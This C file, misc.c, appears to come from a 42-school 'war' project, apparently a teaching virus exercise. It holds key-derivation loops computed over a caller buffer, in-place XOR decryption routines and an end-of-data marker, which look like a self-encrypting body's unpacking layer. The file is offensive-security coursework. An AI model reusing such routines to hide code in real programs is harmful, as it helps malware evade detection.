/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   misc.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/14 16:51:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 14:15:13 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void update_one(t_key *key,  char *caller,  size_t size)
{
	key->one = 0;
	key->junk[0] = 13;
	key->junk[1] = 12;
	for (register size_t index = 0; index < size; index++)
	{

		key->one += caller[index];
		key->junk[index % 2] = index ^ key->one;
		key->one += caller[index] ^ (key->junk[index % 2] + 1);
		key->junk[index % 2] |= key->one;
		key->one += key->junk[index % 2];
	}
	key += 1;
}

void update_two(t_key *key,  char *caller,  size_t size)
{
	key->two = 0;
	key->junk[0] = 13;
	key->junk[1] = 12;
	for (register size_t index = 0; index < size; index++)
	{
		key->two += caller[index];
		key->junk[index % 2] = index ^ key->two;
		key->two += caller[index] ^ (key->junk[index % 2] + 1);
		key->junk[index % 2] |= key->two;
		key->two += key->junk[index % 2];
	}
}

void	revert_one(t_key *key, char *ptr, size_t size)
{
	for (register size_t off = 0 ; off < size ; off++)
	{
		ptr[off] ^= key->one;
	}
}

void	revert_two(t_key *key, char *ptr, size_t size)
{
	for (register size_t off = 0 ; off < size ; off++)
	{
		ptr[off] ^= key->two;
	}
}

void			end_of_data(void)
{
	return ;
}
